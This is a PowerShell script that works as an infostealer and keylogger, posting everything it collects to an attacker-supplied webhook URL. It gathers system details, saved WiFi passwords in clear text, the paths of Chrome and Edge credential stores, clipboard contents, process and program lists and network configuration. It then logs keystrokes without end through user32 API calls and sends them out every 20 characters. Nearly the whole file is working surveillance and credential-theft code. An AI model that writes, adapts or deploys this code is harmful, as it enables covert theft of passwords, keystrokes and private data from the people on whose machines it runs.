param($webhookUrl)

# Function to send data to webhook
function Send-Data {
    param($title, $data)
    $body = "===== $title =====`r`n$data`r`n`r`n"
    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $body -ContentType "text/plain" -UseBasicParsing
}

# === FIRST RUN - Collect System Info ===
try {
    # 1. Public IP
    $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
    Send-Data "PUBLIC IP" $publicIP

    # 2. Computer Info
    $computerInfo = @"
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
Domain: $env:USERDNSDOMAIN
OS: (Get-WmiObject Win32_OperatingSystem).Caption
"@
    Send-Data "COMPUTER INFO" $computerInfo

    # 3. WiFi Saved Passwords
    $wifiProfiles = netsh wlan show profiles | Select-String ":" | ForEach-Object {
        $name = ($_ -split ":")[1].Trim()
        $password = netsh wlan show profile name="$name" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
        if($password) { "$name : $password" }
    }
    Send-Data "WIFI PASSWORDS" ($wifiProfiles -join "`r`n")

    # 4. Running Processes
    $processes = Get-Process | Select-Object -First 50 | Format-Table -AutoSize | Out-String
    Send-Data "RUNNING PROCESSES" $processes

    # 5. Installed Programs
    $programs = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object { $_.DisplayName } | Format-Table -AutoSize | Out-String
    Send-Data "INSTALLED PROGRAMS" $programs

    # 6. Network Adapters
    $network = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Format-List -Property Name, InterfaceDescription, MacAddress | Out-String
    Send-Data "NETWORK ADAPTERS" $network

    # 7. Recent Files (Desktop)
    $recentFiles = Get-ChildItem "$env:USERPROFILE\Desktop" -File | Select-Object -First 10 Name, Length, LastWriteTime | Format-Table -AutoSize | Out-String
    Send-Data "DESKTOP FILES" $recentFiles

    # 8. Browser Saved Credentials (Chrome/Edge locations)
    $browserPaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    )
    $foundBrowsers = $browserPaths | Where-Object { Test-Path $_ } | ForEach-Object { $_ }
    Send-Data "BROWSER PROFILES FOUND" ($foundBrowsers -join "`r`n")

    # 9. Clipboard Content
    try {
        $clipboard = Get-Clipboard
        if($clipboard) { Send-Data "CLIPBOARD CONTENT" $clipboard }
    } catch {}

    # 10. System Info (ipconfig)
    $ipconfig = ipconfig /all | Out-String
    Send-Data "IPCONFIG /ALL" $ipconfig

} catch {
    Send-Data "ERROR ON FIRST RUN" $_.Exception.Message
}

# === KEYLOGGER (Runs Forever) ===
$API=Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int vkc);[DllImport("user32.dll")]public static extern int GetKeyboardState(byte[] ks);[DllImport("user32.dll")]public static extern int MapVirtualKey(uint c,int t);[DllImport("user32.dll")]public static extern int ToUnicode(uint vk,uint sc,byte[] ks,System.Text.StringBuilder b,int cb,uint f);' -Name W -Namespace A -PassThru
$b=@()
while($true){
    for($a=9;$a-le254;$a++){
        if($API::GetAsyncKeyState($a)-eq-32767){
            $v=$API::MapVirtualKey($a,3)
            $k=New-Object Byte[] 256
            $API::GetKeyboardState($k)|Out-Null
            $c=New-Object System.Text.StringBuilder
            if($API::ToUnicode($a,$v,$k,$c,$c.Capacity,0)){
                $b+=$c.ToString()
                if($b.Count-eq20){
                    $keystrokes = $b -join ""
                    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body "===== KEYSTROKES =====`r`n$keystrokes`r`n`r`n" -ContentType "text/plain" -UseBasicParsing
                    $b=@()
                }
            }
        }
    }
    Start-Sleep -Milliseconds 40
}
